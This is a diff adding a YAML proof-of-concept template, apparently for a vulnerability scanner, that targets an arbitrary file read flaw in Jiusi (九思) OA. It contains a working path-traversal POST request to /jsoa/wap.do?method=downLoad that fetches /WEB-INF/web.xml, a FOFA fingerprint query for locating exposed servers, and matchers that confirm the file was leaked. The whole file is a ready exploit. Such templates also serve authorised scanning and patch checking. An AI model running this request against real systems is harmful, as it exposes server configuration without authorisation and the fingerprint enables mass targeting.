@@ -1,0 +1,21 @@
+id: poc-yaml-jiusi-oa-wap-fildread
+info:
+  name: 九思-OA wap.do接口任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 九思OA
+  fofa: app="九思软件-OA"
+requests:
+- method: POST
+  path: /jsoa/wap.do?method=downLoad
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=../&name=&FileName=/WEB-INF/web.xml
+  expression: "status_code == 200 && \n!contains(body,\"<html>\") &&\ncontains(body,\"\
+    <param-value>\") &&\ncontains(body,\"<?xml version\") &&\ncontains(body,\"<servlet-name>\"\
+    ) &&\nmatches(body, \"<filter-class>(.*)</filter-class>\") &&\nmatches(body, \"\
+    <servlet-class>(.*)</servlet-class>\") &&\nmatches(body, \"/WEB-INF/(.*).xml\"\
+    )\n"
+variables: {}
+transport: http
